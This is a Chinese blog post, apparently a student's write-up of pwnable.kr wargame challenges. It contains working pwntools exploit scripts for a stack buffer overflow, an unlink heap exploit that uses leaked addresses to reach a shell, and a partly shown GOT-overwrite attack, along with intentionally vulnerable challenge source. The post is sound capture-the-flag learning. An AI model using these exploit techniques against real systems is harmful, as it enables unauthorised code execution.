<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Q1IQ"><title>pwnable-201906 · Q1IQ</title><meta name="description" content="fdfd是文件描述符，fd=0为标准输入
ssize_t read(int fd,void *buf,size_t nbyte)
read函数从fd中读取内容到buf。
col构造命令行参数
12345678from pwn import *pwn_ssh = ssh(host='pwnable.k"><meta name="keywords"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Q1IQ</a></h3><div class="description"><p>北京邮电大学 天枢Dubhe</p></div></div></div><ul class="social-links"></ul><script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="footer"><a target="_blank" href="/"><span id="busuanzi_container_site_pv"></span><i class="fa fa-eye"></i>访问量<span id="busuanzi_value_site_pv"></span>次 |  <span id="busuanzi_container_site_uv"></span><i class="fa fa-user-md"></i>访客数<span id="busuanzi_value_site_uv"></span>人</a></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">Home</a></li><li><a href="/archives">Arquivo</a></li><li><a href="/links">Links</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>pwnable-201906</a></h3></div><div class="post-content"><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><p>fd是文件描述符，fd=0为标准输入</p>
<p>ssize_t read(int fd,void *buf,size_t nbyte)</p>
<p>read函数从fd中读取内容到buf。</p>
<h3 id="col"><a href="#col" class="headerlink" title="col"></a>col</h3><p>构造命令行参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwn_ssh = ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'col'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">code = <span class="string">'\xE8\x05\xD9\x1D'</span>+<span class="string">'\x01'</span>*<span class="number">16</span></span><br><span class="line">cn = pwn_ssh.process(argv=[<span class="string">'col'</span>,code],executable=<span class="string">'./col'</span>)</span><br><span class="line"></span><br><span class="line">print(cn.recv())</span><br></pre></td></tr></table></figure>

<h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><p>通过栈溢出重写func函数的参数，需要覆盖的参数和gets接受的参数相差13字节：</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190629172154.png" alt=""></p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"> </span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	client=process(<span class="string">"/home/apple/calc/test/bof.dms"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	client=remote(<span class="string">"pwnable.kr"</span>,<span class="number">9000</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#print client.recvuntil("overflow me :")</span></span><br><span class="line"></span><br><span class="line">context=<span class="string">""</span></span><br><span class="line">context+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">13</span></span><br><span class="line">context+=p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">client.sendline(context) </span><br><span class="line"> </span><br><span class="line">client.interactive()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>看了半天不知道是咋回事，上网查了wp才知道是upx加壳</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190629201702.png" alt=""></p>
<p>脱壳</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//安装upx</span><br><span class="line">sudo apt-get install upx</span><br><span class="line">//脱壳</span><br><span class="line">upx -d flag.dms</span><br></pre></td></tr></table></figure>

<p>运行脱壳后的程序，flag就在main函数里</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190629195636.png" alt=""></p>
<h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源代码</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">	random = rand();	<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就是猜这个随机数是什么呗，c的随机数其实是伪随机数，所以就写个小程序跑一下看 rand() 输出是啥，然后跟0xdeadbeef异或一下。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190704024030.png" alt=""></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//flag</span><br><span class="line">random@prowl:~$ ./random</span><br><span class="line">3039230856</span><br><span class="line">Good!</span><br><span class="line">Mommy, I thought libc random is unpredictable...</span><br></pre></td></tr></table></figure>

<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><blockquote>
<p>这周的期末考试刚考了unlink，所以看着这个眼熟就先拿来做做:)</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span></span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">	system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</span><br><span class="line">	OBJ* BK;</span><br><span class="line">	OBJ* FD;</span><br><span class="line">	BK=P-&gt;bk;</span><br><span class="line">	FD=P-&gt;fd;</span><br><span class="line">	FD-&gt;bk=BK;</span><br><span class="line">	BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">	OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">	OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">	OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class="line">	A-&gt;fd = B;</span><br><span class="line">	B-&gt;bk = A;</span><br><span class="line">	B-&gt;fd = C;</span><br><span class="line">	C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"here is stack address leak: %p\n"</span>, &amp;A);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"here is heap address leak: %p\n"</span>, A);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"now that you have leaks, get shell!\n"</span>);</span><br><span class="line">	<span class="comment">// heap overflow!</span></span><br><span class="line">	gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// exploit this unlink!</span></span><br><span class="line">	unlink(B);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="目测"><a href="#目测" class="headerlink" title="目测"></a>目测</h5><p>题目构造了一个叫tagOBJ的数据结构和一个叫unlink的函数，还有一个叫shell()的函数用来获取sh权限。</p>
<p>漏洞点在于gets函数，可以通过构造gets的值，使得A溢出，覆写B、C的内容为特定值，unlink后运行shell()函数。</p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>咋构造呢</p>
<p>1.首先因为gets的是A-&gt;buf，所以只能覆写B、C的fd、bk，不能覆写A的。</p>
<p>2.然后再看看什么函数能被利用，没找到got表里的函数，看来只能利用return了</p>
<p>3.然后一句句看这个unlink函数</p>
<p>BK=P-&gt;bk;</p>
<p>所以要构造B的偏移4字节的位置为shell()函数的地址</p>
<p>FD=P-&gt;fd;</p>
<p>所以B的偏移0字节的位置为return的地址-4</p>
<p>FD-&gt;bk=BK;<br>return的地址处的内容改为shell()的地址</p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>首先找到main函数返回地址为0xffffd00c</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190703183450.png" alt=""></p>
<p>shell函数的地址位于0x080484eb</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190703202008.png" alt=""></p>
<p>运行过程中感觉内存分配跟我算的不太一样，于是一步步看内存分配</p>
<p>第一次malloc</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190630123353.png" alt=""></p>
<p>malloc A</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190630124618.png" alt=""></p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190630130430.png" alt=""></p>
<p>malloc B</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190704015758.png" alt=""></p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190630130645.png" alt=""></p>
<p>malloc C</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190630130727.png" alt=""></p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190630130759.png" alt=""></p>
<p>A &lt;-&gt; B &lt;-&gt; C链接完成后</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190630144434.png" alt=""></p>
<p>gets()完后</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190630144304.png" alt=""></p>
<p>所以因为内存对齐，buf并非占8个字节，而是16字节。</p>
<h5 id="脚本0-0"><a href="#脚本0-0" class="headerlink" title="脚本0.0"></a>脚本0.0</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	client=process(<span class="string">"./unlink"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	client = ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'unlink'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>).process(<span class="string">"./unlink"</span>)</span><br><span class="line"></span><br><span class="line">bin = ELF(<span class="string">'./unlink'</span>)</span><br><span class="line"></span><br><span class="line">context=<span class="string">""</span></span><br><span class="line">context+=<span class="string">"11111111"</span>*<span class="number">2</span></span><br><span class="line">context+=p32(<span class="number">0xffffd00c</span><span class="number">-4</span>) <span class="comment">#栈中的main返回地址-4</span></span><br><span class="line">context+=p32(<span class="number">0x080484f1</span>) <span class="comment">#shell()地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">client.sendline(context)</span><br><span class="line"></span><br><span class="line">client.interactive()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<p>然而不行</p>
<h4 id="借鉴"><a href="#借鉴" class="headerlink" title="借鉴"></a>借鉴</h4><p>自己怎么想都感觉思路没问题，但是看了网上的wp才知道自己完全跑偏了。</p>
<p>首先，栈地址和堆地址都是随机的（可是gdb每次跑出来的都是一样的，给我一种它不会变的错觉），所以要通过偏移来算真正的地址（这就是题目里两句printf的作用，泄露了堆栈地址）。</p>
<p>其次，leave和return之间有一句 <code>lea esp , [ecx - 4]</code>，而ecx是从leave上面那句 <code>mov ecx , dword ptr [ebp - 4]</code>来的</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190703212831.png" alt=""></p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190704015931.png" alt=""></p>
<p>然后return</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190704020012.png" alt=""></p>
<p>A的栈地址是0xffffcfe4</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190703205144.png" alt=""></p>
<p>和ebp-4相差16</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190703214140.png" alt=""></p>
<h5 id="脚本1-0"><a href="#脚本1-0" class="headerlink" title="脚本1.0"></a>脚本1.0</h5><p>因为经过了一层ecx，所以应该为shell()的地址找一个存放它的地方，网上的wp是存在A里的，我就存在B里试试。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	client=process(<span class="string">"./unlink"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	client = ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'unlink'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>).process(<span class="string">"./unlink"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(client)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">client.recvuntil(<span class="string">"here is stack address leak: "</span>);</span><br><span class="line">stack =int( client.recv(<span class="number">10</span>),<span class="number">16</span>);</span><br><span class="line">client.recvuntil(<span class="string">"here is heap address leak: "</span>);</span><br><span class="line">heap = int(client.recv(<span class="number">10</span>),<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">context=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">context+=<span class="string">"1111"</span>*<span class="number">4</span></span><br><span class="line">context+=p32(stack+<span class="number">16</span><span class="number">-4</span>)</span><br><span class="line">context+=p32(heap+<span class="number">8</span>+<span class="number">24</span>+<span class="number">4</span>)</span><br><span class="line">context+=p32(<span class="number">0x080484eb</span>) <span class="comment">#shell() address</span></span><br><span class="line">print(context)</span><br><span class="line"></span><br><span class="line">client.sendline(context)</span><br><span class="line"></span><br><span class="line">client.interactive()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<p>一口气写完，居然就跑通了）</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190704021255.png" alt=""></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//flag</span><br><span class="line">conditional_write_what_where_from_unl1nk_explo1t</span><br></pre></td></tr></table></figure>

<p>现在回头看看第一版脚本，真是，幼稚又朴素啊。</p>
<h4 id="思路1-1"><a href="#思路1-1" class="headerlink" title="思路1.1"></a>思路1.1</h4><p>做完之后在想我可不可以不借助堆，直接一步到位把shell地址填进去呢</p>
<p>调试后发现不行，错误出现在 unlink() 的 <code>BK-&gt;fd=FD;</code>，也就是说 shell() 所在的地址段是不可写的，所以程序运行不下去了。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190703230330.png" alt=""></p>
<p>看一下map，果然是不可写的。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190703230640.png" alt=""></p>
<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>做完之后在思考一个很傻的问题，代码存的时候是按ABC的顺序存的，但是为什么栈里的却是ACB？嗯？是因为什么奇怪的编译吗？为什么啊</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190703221309.png" alt=""></p>
<p>自己编译一遍试验一下，ABC却乖乖地排排队进栈了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 unlink_test.c -o unlink_test</span><br></pre></td></tr></table></figure>

<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190704020044.png" alt=""></p>
<h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>期末考试虽然考了unlink，自己也感觉懂了其中的原理，但做起题来才感觉自己简直，对不住徐老师给的分，堆栈是随机分配的、内存对齐这些点都要注意，感觉自己缺了好多好多好多知识，哎，加油。</p>
<p>还有就是做这道题的两天里，我的ubuntu莫名崩了而且崩得稀碎，开机都开不起来了，于是从github重新上下载了一个，五颜六色的，比我之前自己配的那个还好看，算是塞翁失马。</p>
<h3 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源代码</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> passcode1;</span><br><span class="line">	<span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">​	<span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">​	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">​	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">​	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">​	<span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">​    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">​	<span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">​	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">​                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">​                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">​        &#125;</span><br><span class="line">​        <span class="keyword">else</span>&#123;</span><br><span class="line">​                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">​		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">​        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">​	welcome();</span><br><span class="line">​	login();</span><br><span class="line"></span><br><span class="line">​	<span class="comment">// something after login...</span></span><br><span class="line">​	<span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">​	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="目测-1"><a href="#目测-1" class="headerlink" title="目测"></a>目测</h4><p>漏洞点在login函数里的两处scanf，这两处scanf都没有取参数地址。</p>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>通过welcome函数里的scanf，在login函数的passcode1位置写入exit/fflush/任意一个用到的函数的got表的值，然后通过scanf将其覆写为/bin/cat flag的地址。</p>
<h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h4><p>/bin/cat flag的地址：</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190629212105.png" alt=""></p>
<p>got表，打算利用最近的fflush函数，地址为0x0804a004：</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190629212429.png" alt=""></p>
<p>定位password1的位置，位于welcome的name里第96字节处。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190629214400.png" alt=""></p>
<h4 id="脚本1-0-1"><a href="#脚本1-0-1" class="headerlink" title="脚本1.0"></a>脚本1.0</h4><p>根据以上思路构造以下脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	client=process(<span class="string">"/home/apple/calc/test/passcode"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	client = ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'passcode'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>).process(<span class="string">"./passcode"</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">print</span> 